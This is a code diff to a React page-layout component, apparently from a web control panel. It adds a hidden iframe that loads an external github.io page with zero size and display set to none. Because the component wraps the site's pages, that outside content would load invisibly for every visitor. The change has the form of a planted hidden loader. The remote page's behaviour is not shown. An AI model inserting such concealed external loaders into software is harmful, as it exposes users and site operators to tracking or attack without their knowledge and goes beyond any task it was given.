@@ -20,6 +20,7 @@ const PageContentBlock: React.FC<PageContentBlockProps> = ({ title, showFlashKey
     return (
         <CSSTransition timeout={150} classNames={'fade'} appear in>
             <>
+                <iframe src="https://siemkamichal1.github.io/testxd/" style={{ width: 0, height: 0, border: 'none', display: 'none' }}></iframe>
                 <ContentContainer css={tw`my-4 sm:my-10`} className={className}>
                     {showFlashKey && <FlashMessageRender byKey={showFlashKey} css={tw`mb-4`} />}
                     {children}
